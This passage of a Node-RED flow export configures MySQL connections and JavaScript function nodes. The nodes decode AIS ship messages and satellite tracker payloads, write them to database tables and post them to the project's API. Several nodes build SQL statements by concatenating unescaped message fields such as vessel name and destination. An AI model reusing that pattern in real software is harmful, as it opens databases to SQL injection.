        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "7a51fe6abe3c127f",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "b47258cf45ab94ed",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "0d4577e88360a832",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "fb6290d2789e4005",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "3212c2b9630d5a79",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "a8ca26ea719245ec",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "568fbd90132245c7",
        "type": "websocket-listener",
        "path": "/ws/geofence",
        "wholemsg": "false"
    },
    {
        "id": "d4126176.99a47",
        "type": "function",
        "z": "7b598f00.47fb3",
        "name": "",
        "func": "if (msg.parsed.ship_id === 0) {\n  msg.parsed.ship_id = msg.payload.insertId;\n}\nvar parsed = msg.parsed;\n\nObject.size = function (obj) {\n  var size = 0,\n    key;\n  for (key in obj) {\n    if (obj.hasOwnProperty(key)) size++;\n  }\n  return size;\n};\n\nfunction addZero(i) {\n  if (i < 10) {\n    i = \"0\" + i;\n  }\n  return i;\n}\n\nvar dynamic = parsed.dynamic;\nvar destination = parsed.destination;\nvar draught = parsed.draught;\nvar dynamicSize = Object.size(dynamic);\nvar destinationSize = Object.size(destination);\nvar draughtSize = Object.size(draught);\n\nmsg.parsed.size = {};\nmsg.parsed.size.dynamic = dynamicSize;\nmsg.parsed.size.destination = destinationSize;\nmsg.parsed.size.draught = draughtSize;\n\nvar d = new Date();\nvar suffix = String(d.getUTCFullYear()) + String(addZero(d.getUTCMonth() + 1));\nvar insertDynamic =\n  \"INSERT INTO ais_dynamic_\" + suffix + \" set ship_id=\" + parsed.ship_id + \",\";\nvar updateDynamic =\n  \"INSERT INTO ais_dynamic set ship_id=\" + parsed.ship_id + \",\";\nif (parsed.exists) {\n  updateDynamic = \"UPDATE ais_dynamic set \";\n}\ni = 1;\nObject.keys(dynamic).forEach((key) => {\n  if (i > 1) {\n    insertDynamic += \",\";\n    updateDynamic += \",\";\n  }\n  var column = String(key);\n  var value = String(dynamic[key]);\n  if (value === \"undefined\") {\n    value = \"0\";\n  }\n  if (column === \"raim\") {\n    if (value === \"false\") {\n      value = \"0\";\n    } else {\n      value = \"1\";\n    }\n  }\n  if (column === \"latitude\" || column === \"longitude\") {\n    if (value !== \"0\" && value !== \"undefined\") {\n      insertDynamic += column + \"='\" + value + \"'\";\n      updateDynamic += column + \"='\" + value + \"'\";\n    }\n  } else {\n    insertDynamic += column + \"='\" + value + \"'\";\n    updateDynamic += column + \"='\" + value + \"'\";\n  }\n  i++;\n});\ninsertDynamic += \",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\nif (!parsed.exists) {\n  updateDynamic += \",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n} else {\n  updateDynamic +=\n    \",updated_at=UTC_TIMESTAMP() WHERE ship_id=\" + parsed.ship_id;\n}\n\nmsg.insertDynamic = insertDynamic.replace(\",,,\", \",\");\nmsg.updateDynamic = updateDynamic.replace(\",,,\", \",\");\n\nvar insertDestination = 0;\ni = 1;\nif (destination.destination !== undefined) {\n  var tempEta = destination.eta.toISOString().slice(0, 19).replace(\"T\", \" \");\n  destination.eta = tempEta;\n  insertDestination =\n    \"INSERT INTO ais_destination set ship_id=\" + parsed.ship_id + \",\";\n  Object.keys(destination).forEach((key) => {\n    if (i > 1) {\n      insertDestination += \",\";\n    }\n    var column = String(key);\n    var value = String(destination[key]);\n    insertDestination += column + \"='\" + value + \"'\";\n    i++;\n  });\n  insertDestination += \",updated_at='\" + parsed.time_stamp + \"'\";\n}\nmsg.insertDestination = insertDestination;\n\nvar insertDraught = 0;\ni = 1;\nif (draught.draught !== undefined) {\n  insertDraught = \"INSERT INTO ais_draught set ship_id=\" + parsed.ship_id + \",\";\n  Object.keys(draught).forEach((key) => {\n    if (i > 1) {\n      insertDraught += \",\";\n    }\n    var column = String(key);\n    var value = String(draught[key]);\n    insertDraught += column + \"='\" + value + \"'\";\n    i++;\n  });\n  insertDraught += \",updated_at='\" + parsed.time_stamp + \"'\";\n}\nmsg.insertDraught = insertDraught;\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 140,
        "y": 180,
        "wires": [
            [
                "1b5d0094.12f46f"
            ]
        ]
    },
    {
        "id": "1b5d0094.12f46f",
        "type": "change",
        "z": "7b598f00.47fb3",
        "name": "insertDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "b3bec05c.c41d6",
        "type": "change",
        "z": "7b598f00.47fb3",
        "name": "updateDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "updateDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "fee86eac.190c",
        "type": "change",
        "z": "7b598f00.47fb3",
        "name": "insertDestination",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDestination",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 570,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "118008ba.9b81a7",
        "type": "change",
        "z": "7b598f00.47fb3",
        "name": "insertDraught",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDraught",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 540,
        "y": 400,
        "wires": [
            []
        ]
    },
    {
        "id": "7df30325.b831fc",
        "type": "switch",
        "z": "7b598f00.47fb3",
        "name": "checkDestination",
        "property": "insertDestination",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 350,
        "y": 300,
        "wires": [
            [
                "fee86eac.190c"
            ],
            [
                "e2d0611d.63e8e"
            ]
        ]
    },
    {
        "id": "e2d0611d.63e8e",
        "type": "switch",
        "z": "7b598f00.47fb3",
        "name": "checkDraught",
        "property": "insertDraught",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 340,
        "y": 380,
        "wires": [
            [
                "118008ba.9b81a7"
            ],
            []
        ]
    },
    {
        "id": "7ffa0bc2.325294",
        "type": "function",
        "z": "7b598f00.47fb3",
        "name": "",
        "func": "var decoded=msg.payload;\nmsg.decoded=decoded;\nif(decoded!==undefined){\n    msg.sqlStatic=\"SELECT * from ais_static where mmsi='\"+msg.payload.senderMmsi+\"'\";\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 560,
        "y": 20,
        "wires": [
            [
                "bbc0ceee.0c12c"
            ]
        ]
    },
    {
        "id": "b2d94a60.3402c8",
        "type": "switch",
        "z": "7b598f00.47fb3",
        "name": "If !Undefined",
        "property": "payload",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "str"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 410,
        "y": 60,
        "wires": [
            [
                "7ffa0bc2.325294"
            ],
            []
        ]
    },
    {
        "id": "bbc0ceee.0c12c",
        "type": "change",
        "z": "7b598f00.47fb3",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "sqlStatic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 710,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "53f8f62.5c42f08",
        "type": "function",
        "z": "7b598f00.47fb3",
        "name": "",
        "func": "// if (msg.payload && !msg.payload.length){\n//     msg.result=\"No Data\";\n// }else{\n//     msg.result=msg.payload.length;\n// }\n// return msg;\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar isDataExists=true;\nvar ship_id=0;\nvar aisData={static:{},dynamic:{},destination:{},draught:{}};\n\nif (msg.payload && !msg.payload.length){\n    isDataExists=false;\n}\n\nvar d = new Date();\nvar time_stamp = String(d.getUTCFullYear())+'-'+String(addZero(d.getUTCMonth()+1))+'-'+String(addZero(d.getUTCDate()))+' ';\ntime_stamp += String(addZero(d.getUTCHours()))+':'+String(addZero(d.getUTCMinutes()))+':'+String(addZero(d.getUTCSeconds()));\n\n//Init Ship ID\nif(!isDataExists){\n    ship_id=0;\n}else{\n    ship_id=msg.payload[0].id;\n}\naisData.ship_id=ship_id;\n//Static Data\naisData.static.mmsi=msg.decoded.senderMmsi,\naisData.static.callsign=msg.decoded.callsign,\naisData.static.vessel_name=msg.decoded.name,\naisData.static.imo=msg.decoded.shipId,\naisData.static.ship_type=msg.decoded.shipType,\naisData.static.dimension_a=msg.decoded.dimensionToBow,\naisData.static.dimension_b=msg.decoded.dimensionToStern,\naisData.static.dimension_c=msg.decoded.dimensionToPort,\naisData.static.dimension_d=msg.decoded.dimensionToStarboard,\naisData.static.fix_type=msg.decoded.fix_type,\n//Dynamic Data\naisData.dynamic.station_id=global.get('stationId'),\naisData.dynamic.sog=msg.decoded.speedOverGround,\naisData.dynamic.cog=msg.decoded.courseOverGround,\naisData.dynamic.heading=msg.decoded.trueHeading,\naisData.dynamic.turning_direction=msg.decoded.turningDirection,\naisData.dynamic.rot=msg.decoded.turningRate,\naisData.dynamic.bearing=0,\naisData.dynamic.nav_status=msg.decoded.navigationStatus,\naisData.dynamic.latitude=msg.decoded.latitude,\naisData.dynamic.longitude=msg.decoded.longitude,\naisData.dynamic.raim=msg.decoded.raim,\naisData.dynamic.msg_type=msg.decoded.messageType,\naisData.dynamic.repeat_indicator=msg.decoded.repeatIndicator,\naisData.dynamic.position_accuracy=msg.decoded.positionAccuracy,\n//Destination\naisData.destination.destination=msg.decoded.destination,\naisData.destination.eta=msg.decoded.eta,\n//Draught\naisData.draught.draught=msg.decoded.draught;\n//Timestamp\naisData.time_stamp=time_stamp;\n//isExists?\naisData.exists=isDataExists;\n\nmsg.parsed=aisData;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 340,
        "y": 120,
        "wires": [
            [
                "ef250fc8.bb992"
            ]
        ]
    },
    {
        "id": "ef250fc8.bb992",
        "type": "function",
        "z": "7b598f00.47fb3",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nvar parsed=msg.parsed;\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\nvar astatic=parsed.static;\nvar staticSize = Object.size(astatic);\n\nvar insertStatic;\nvar isUpdate=false;\nif(!parsed.exists){\n\tinsertStatic=\"INSERT INTO ais_static set \";\n}else{\n    insertStatic=\"UPDATE ais_static set \";\n    isUpdate=true;\n}\nvar i=1;\nObject.keys(astatic).forEach(key => {\n    // console.log(key, astatic[key]);\n    if(i>1){\n        insertStatic+=\",\";\n    }\n    var column = String(key);\n    var value = String(astatic[key]);\n    if(value===\"undefined\"){\n        value=0;\n        if(column==\"vessel_name\"){\n            value=\"\";\n        }else if(column==\"imo\"){\n            value=\"\";\n        }else if(column==\"callsign\"){\n            value=\"\";\n        }\n    }\n    insertStatic+=column+\"='\"+value+\"'\";\n    i++;\n});\n// console.log(insertStatic);\nif(isUpdate){\n    insertStatic+=\",updated_at=UTC_TIMESTAMP() WHERE id=\"+parsed.ship_id;\n}else{\n    insertStatic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}\nmsg.topic=insertStatic;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 480,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "fae1fbc4.fa3508",
        "type": "function",
        "z": "7b598f00.47fb3",
        "name": "",
        "func": "if(msg.payload===undefined){\n    msg.payload=0;\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 260,
        "y": 60,
        "wires": [
            [
                "b2d94a60.3402c8"
            ]
        ]
    },
    {
        "id": "21166bb3.8ca3c4",
        "type": "debug",
        "z": "3871bd02.8a9a62",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": true,
        "complete": "true",
        "targetType": "full",
        "statusVal": "payload",
        "statusType": "auto",
        "x": 430,
        "y": 220,
        "wires": []
    },
    {
        "id": "18b115dc.d9d47a",
        "type": "function",
        "z": "3871bd02.8a9a62",
        "name": "payloadSwitch",
        "func": "var orientMap = {\n  0: { lat: \"1\", lon: \"1\" },\n  1: { lat: \"1\", lon: \"0\" },\n  2: { lat: \"0\", lon: \"1\" },\n  3: { lat: \"0\", lon: \"0\" },\n};\n\nfunction zFill(str,num){\n    for(var i=1;i<=num;i++){\n        str=\"0\"+str;\n    }\n    return str;\n}\n\nfunction padLeft(num, size) {\n    num = num.toString();\n    while (num.length < size) num = \"0\" + num;\n    num = num.substring(num.length, num.length - size);\n    return num;\n}\n\nfunction hex2bin(hex){\n    return (parseInt(hex, 16).toString(2));\n}\n\nfunction hex2ascii(string){\n\tvar hex  = string.toString();\n\tvar str = '';\n\tfor (var n = 0; n < hex.length; n += 2) {\n\t\tstr += String.fromCharCode(parseInt(hex.substr(n, 2), 16));\n\t}\n\treturn str;\n}\n\nfunction decode(key,raw) {\n    switch (key) {\n        case \"dt\":\n            var nd = new Date(0);\n            var epoch = parseInt(raw);\n            // msg.epoch=epoch;\n            nd.setUTCSeconds(epoch);\n            var y = String(nd.getFullYear());\n            var m = padLeft(nd.getMonth()+1,2);\n            var d = padLeft(nd.getDate(),2);\n            var H = padLeft(nd.getHours(),2);\n            var i = padLeft(nd.getMinutes(),2);\n            var s = padLeft(nd.getSeconds(),2);\n            return y + \"-\" + m + \"-\" + d + \" \" + H + \":\" + i + \":\" + s;\n        case \"lat\":\n            var latitude = String(parseInt(raw, 16));\n            var filled = zFill(latitude,10-latitude.length);\n            var negatif = filled.substring(0,1);\n            var decNum = filled.substring(1, 4);\n            var afterDec = filled.substring(4, 10);\n            var neg = \"\";\n            if (negatif == \"1\") {\n                neg = \"-\";\n            }\n            return String(parseFloat(neg + decNum + \".\" + afterDec));\n        case \"lng\":\n            var longitude = String(parseInt(raw, 16));\n            filled = zFill(longitude,10-longitude.length);\n            negatif = filled.substring(0, 1);\n            decNum = filled.substring(1, 4);\n            afterDec = filled.substring(4, 10);\n            neg = \"\";\n            if (negatif == \"1\") {\n                neg = \"-\";\n            }\n            return String(parseFloat(neg + decNum + \".\" + afterDec));\n        case \"cogsog\":\n            return String(raw);\n        case \"mmsi\":\n            return String(parseInt(raw, 16));\n            \n    }\n}\n\n\nfunction restruct(parsed,ssasFlag,gpsFlag){\n    var result = {};\n    delete parsed.cogsog;\n    delete parsed.gpsq_mtr;\n    parsed.datetime=parsed.dt;\n    delete parsed.dt;\n    \n    if(parsed.ssas1!==\"0\"){\n        ssasFlag=parsed.ssas1;\n    }\n    if(parsed.ssas2!==\"0\"){\n        ssasFlag=parsed.ssas2;\n    }\n    result.postData=parsed;\n    result.postUrl='https://dev.cakrawala.id/api/apilite';\n    result.gpsFlag=gpsFlag;\n    result.ssasFlag=ssasFlag;\n    return result;\n}\n\nfunction runParser(dataMap,parsed,rawMsg,typeName,num){\n    var index = 0;\n    Object.keys(dataMap).forEach(key => {\n        var rawData=rawMsg.substring(index,(dataMap[key]+index));\n        // parsed.raw[key]=rawData;\n        // var textData=decode(key,rawData);\n        // parsed[typeName][key]=textData;\n        // index=index+dataMap[key];\n        if(num==='obj'){\n            parsed.raw[key]=rawData;\n            var textData=decode(key,rawData);\n            parsed[typeName][key]=textData;\n            index=index+dataMap[key];\n        }\n        else{\n            // parsed[typeName]={};\n            // parsed[typeName][num]={};\n            parsed.raw[key]=rawData;\n            var aisData=decode(key,rawData);\n            parsed[typeName][String(num)][key]=aisData;\n            index=index+dataMap[key];\n        }\n    });\n    return parsed;\n}\n\nfunction msgParser(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n    var result={};\n    var msgLen=parseInt(msg.substring(0,4),16)*2;\n    var payload=msg.substring(4);\n    var datalen={lat:8,lng:8,cogsog:6};\n    var parsed={raw:{},text:{},ais:{}};\n    runParser(datalen,parsed,payload,'text','obj');\n    parsed.text['dt']=decode('dt',sbdLoc.sbdTimestamp);\n    parsed.text.imei=String(imei);\n    parsed.text.assetId=String(device.asset_id);\n    parsed.text.cog=parsed.text.cogsog.substring(0,3);\n    parsed.text.sog=parsed.text.cogsog.substring(3,6);\n    // var restructed=restruct(parsed.text,ssasFlag,gpsFlag);\n    // result.postData=restructed.postData;\n    // result.postUrl=restructed.postUrl;\n    result.postData=parsed.text;\n    if(msgLen>22){\n        var index = 0;\n        var aisPl=msg.substring(26);\n        var dataAIS={mmsi:8,lat:8,lng:8};\n        var max=(msgLen-22)/24;\n        for(var i=0;i<max;i++){\n            // var tempParsed={ais:{}};\n            // msg.hexAIS=aisPl.substring(index,(index+24));\n            parsed.ais[String(i)]={};\n            runParser(dataAIS,parsed,aisPl.substring(index,(index+24)),'ais',String(i));\n            // parsed.ais[String(i)]=runParser(dataAIS,tempParsed,aisPl.substring(index,(index+24)),'ais');\n        }\n        result.postData.ais=parsed.ais;\n    }else{\n        result.postData.ais=0;\n    }\n    // result.postAIS=parsed.ais;\n    result.postUrl=\"https://dev.cakrawala.id/api/apiplane\";\n    // result.ssasFlag=restructed.ssasFlag;\n    // result.gpsFlag=restructed.gpsFlag;\n    // result.topic =\n    //     \"UPDATE node_flags set gps=\" +\n    //     String(restructed.gpsFlag) +\n    //     \", ssas=\" +\n    //     String(restructed.ssasFlag) +\n    //     \" where imei='\" +\n    //     String(imei) +\n    //     \"'\";\n    // result.sbdLoc=sbdLoc;\n    return result;\n}\n\n\n// return msg;\nvar hexpl = msg.sbd.hexpayload;\nvar imei = msg.sbd.imei;\nvar device = msg.payload.message;\n// var sbdpl = msg.payload.sbdpayload;\nvar orient = msg.sbd.sbdOrient;\nvar latDeg = msg.sbd.sbdLatDeg;\nvar latMin = msg.sbd.sbdLatMin;\nvar lonDeg = msg.sbd.sbdLonDeg;\nvar lonMin = msg.sbd.sbdLonMin;\nvar sbdTimestamp = msg.sbd.sbdTimestamp;\n// var ssasFlag = parseInt(msg.payload.ssas);\n// var gpsFlag = parseInt(msg.payload.gps);\nvar ssasFlag = 0;\nvar gpsFlag = 1;\n\nvar sbdLoc = {\n  orient: orient,\n  latDeg: latDeg,\n  latMin: latMin,\n  lonDeg: lonDeg,\n  lonMin: lonMin,\n  orientMap: orientMap,\n  sbdTimestamp: sbdTimestamp,\n};\n// msg.sbdLoc=sbdLoc;\n\nvar parsedMsg;\nif (device !== null) {\n    pl = String(hexpl).toUpperCase();\n    parsedMsg = msgParser(pl,imei,device,sbdLoc,ssasFlag,gpsFlag);\n} else {\n    parsedMsg = {\n        postData: { status: \"Device Not Found or Not Registered\" },\n        postUrl: \"https://dev.cakrawala.id/api/asdfghjkl\",\n    };\n}\n// return {\"postdata\":parsedMsg.postData,\"posturl\":parsedMsg.postUrl};\nmsg.parsed = parsedMsg;\nmsg.topic = parsedMsg.topic;\nmsg.headers = {};\nmsg.method = \"POST\";\nmsg.url = parsedMsg.postUrl;\nmsg.headers[\"content-type\"] = \"application/json\";\nmsg.payload = parsedMsg.postData;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 180,
        "y": 100,
        "wires": [
            [
                "fdaace37.fa212",
                "f2aeb46d.c17a68"
            ]
        ]
    },
    {
        "id": "497830e2.752c8",
        "type": "http request",
        "z": "3871bd02.8a9a62",
        "name": "",
        "method": "use",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "x": 170,
        "y": 180,
        "wires": [
            [
                "21166bb3.8ca3c4"
            ]
        ]
    },
    {
        "id": "61c7e860.bc0368",
        "type": "json",
        "z": "3871bd02.8a9a62",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 290,
        "y": 140,
        "wires": [
            [
                "497830e2.752c8"
            ]
        ]
    },
    {
        "id": "f3c077b7.0bb668",
        "type": "status",
        "z": "3871bd02.8a9a62",
        "name": "",
        "scope": [
            "afb1aab4.2390d8"
        ],
        "x": 160,
        "y": 220,
        "wires": [
            [
                "21166bb3.8ca3c4"
            ]
        ]
    },
    {
        "id": "cc8f3cbd.45456",
        "type": "change",
        "z": "3871bd02.8a9a62",
        "name": "setMsgPl",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "\"SELECT * FROM node_flags where imei='\"&msg.payload.imei&\"';\"",
                "tot": "jsonata"
            },
            {
                "t": "set",
                "p": "rcv.payload",
                "pt": "msg",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 160,
        "y": 40,
        "wires": [
            [
                "18b115dc.d9d47a"
            ]
        ]
    },
    {
        "id": "7ecf7aef.b13ef4",
        "type": "change",
        "z": "3871bd02.8a9a62",
        "name": "restruct",
        "rules": [
            {
                "t": "set",
                "p": "rcv.payload.gps",
                "pt": "msg",
                "to": "payload[0].gps",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "rcv.payload.ssas",
                "pt": "msg",
                "to": "payload[0].ssas",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "rcv.payload",
                "tot": "msg"
            },
            {
                "t": "delete",
                "p": "rcv",
                "pt": "msg"
            },
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 520,
        "y": 40,
        "wires": [
            [
                "d286be2a.2c985"
            ]
        ]
    },
    {
        "id": "f2aeb46d.c17a68",
        "type": "change",
        "z": "3871bd02.8a9a62",
        "name": "remTopic",
        "rules": [
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 160,
        "y": 140,
        "wires": [
            [
                "61c7e860.bc0368"
            ]
        ]
    },
    {
        "id": "34d7e6fa.50c55a",
        "type": "catch",
        "z": "3871bd02.8a9a62",
        "name": "",
        "scope": [
            "18b115dc.d9d47a"
        ],
        "uncaught": false,
        "x": 200,
        "y": 300,
        "wires": [
            [
                "21166bb3.8ca3c4"
            ]
        ]
    },
    {
        "id": "d286be2a.2c985",
        "type": "debug",
        "z": "3871bd02.8a9a62",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 760,
        "y": 40,
        "wires": []
    },
    {
        "id": "fdaace37.fa212",
        "type": "debug",
        "z": "3871bd02.8a9a62",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 510,
        "y": 160,
        "wires": []
    },
    {
        "id": "c62139d2.549b88",
        "type": "debug",
        "z": "1a8900a7.c00e9f",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": true,
        "complete": "true",
        "targetType": "full",
        "statusVal": "payload",
        "statusType": "auto",
        "x": 430,
        "y": 260,
        "wires": []
    },
    {
        "id": "531d72d1.da140c",
        "type": "function",
        "z": "1a8900a7.c00e9f",
        "name": "payloadSwitch",
        "func": "var orientMap = {\n  0: { lat: \"1\", lon: \"1\" },\n  1: { lat: \"1\", lon: \"0\" },\n  2: { lat: \"0\", lon: \"1\" },\n  3: { lat: \"0\", lon: \"0\" },\n};\n\nfunction zFill(str,num){\n    for(var i=1;i<=num;i++){\n        str=\"0\"+str;\n    }\n    return str;\n}\n\nfunction padLeft(num, size) {\n    num = num.toString();\n    while (num.length < size) num = \"0\" + num;\n    num = num.substring(num.length, num.length - size)\n    return num;\n}\n\nfunction hex2bin(hex){\n    return (parseInt(hex, 16).toString(2));\n}\n\nfunction hex2ascii(string){\n\tvar hex  = string.toString();\n\tvar str = '';\n\tfor (var n = 0; n < hex.length; n += 2) {\n\t\tstr += String.fromCharCode(parseInt(hex.substr(n, 2), 16));\n\t}\n\treturn str;\n}\n\nfunction decode(key,raw) {\n    switch (key) {\n        case \"dt\":\n            var nd = new Date(0);\n            var epoch = parseInt(raw, 16);\n            nd.setUTCSeconds(epoch);\n            var y = String(nd.getFullYear());\n            var m = nd.getMonth()+1;\n            var d = String(nd.getDate());\n            var H = nd.getHours();\n            var i = nd.getMinutes();\n            var s = nd.getSeconds();\n            if(m<10){\n                m=\"0\"+String(m);\n            }else{\n                m=String(m);\n            }\n            return y + \"-\" + m + \"-\" + d + \" \" + H + \":\" + i + \":\" + s;\n        case \"lat\":\n            var latitude = String(parseInt(raw, 16));\n            var filled = zFill(latitude,10-latitude.length);\n            var negatif = filled.substring(0,1);\n            var decNum = filled.substring(1, 4);\n            var afterDec = filled.substring(4, 10);\n            var neg = \"\";\n            if (negatif == \"0\") {\n                neg = \"-\";\n            }\n            return String(parseFloat(neg + decNum + \".\" + afterDec));\n        case \"lng\":\n            var longitude = String(parseInt(raw, 16));\n            filled = zFill(longitude,10-longitude.length);\n            negatif = filled.substring(0, 1);\n            decNum = filled.substring(1, 4);\n            afterDec = filled.substring(4, 10);\n            neg = \"\";\n            if (negatif == \"0\") {\n                neg = \"-\";\n            }\n            return String(parseFloat(neg + decNum + \".\" + afterDec));\n        case \"cogsog\":\n            var cs = String(parseInt(raw, 16));\n            filled = zFill(cs,5-cs.length);\n            return filled;\n        case \"batt\":\n            return raw.substring(0,1)+\".\"+raw.substring(1);\n        case \"stat\":\n            return padLeft(String(hex2bin(raw)),8);\n        case \"gpsq_mtr\":\n            return raw;\n    }\n}\n\nfunction decodeHardware(key,raw) {\n    switch (key) {\n        case \"prefix\":\n            return hex2ascii(raw);\n        case \"serialNum\":\n            return raw;\n        case \"firmwareVer\":\n            firmwareVer = raw.split(\"\")\n            return firmwareVer[0] + \".\" + firmwareVer[1];\n        case \"hardwareVer\":\n            hardwareVer = raw.split(\"\")\n            return hardwareVer[0] + \".\" + hardwareVer[1];\n    }\n}\n\nfunction restruct(parsed,ssasFlag,gpsFlag){\n    var result = {};\n    delete parsed.cogsog;\n    delete parsed.gpsq_mtr;\n    parsed.datetime=parsed.dt;\n    delete parsed.dt;\n    \n    if(parsed.ssas1!==\"0\"){\n        ssasFlag=parsed.ssas1;\n    }\n    if(parsed.ssas2!==\"0\"){\n        ssasFlag=parsed.ssas2;\n    }\n    result.postData=parsed;\n    result.postUrl='https://dev.cakrawala.id/api/apikapalikan';\n    result.gpsFlag=gpsFlag;\n    result.ssasFlag=ssasFlag;\n    return result;\n}\n\nfunction msgParser(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n  // var msgLength = msg.substring(0, 4);\n    var result={};\n    var payload=msg.substring(4);\n    var datalen={dt:8,lat:8,lng:8,cogsog:4,batt:2,stat:2,gpsq_mtr:2};\n    var parsed={raw:{},text:{}};\n    var index = 0;\n    Object.keys(datalen).forEach(key => {\n        var rawData=payload.substring(index,(datalen[key]+index));\n        parsed.raw[key]=rawData;\n        var textData=decode(key,rawData);\n        parsed.text[key]=textData;\n        index=index+datalen[key];\n    });\n    parsed.text.imei=String(imei);\n    parsed.text.assetId=String(device.asset_id);\n    parsed.text.cog=parsed.text.cogsog.substring(0,3);\n    parsed.text.sog=parsed.text.cogsog.substring(3,5);\n    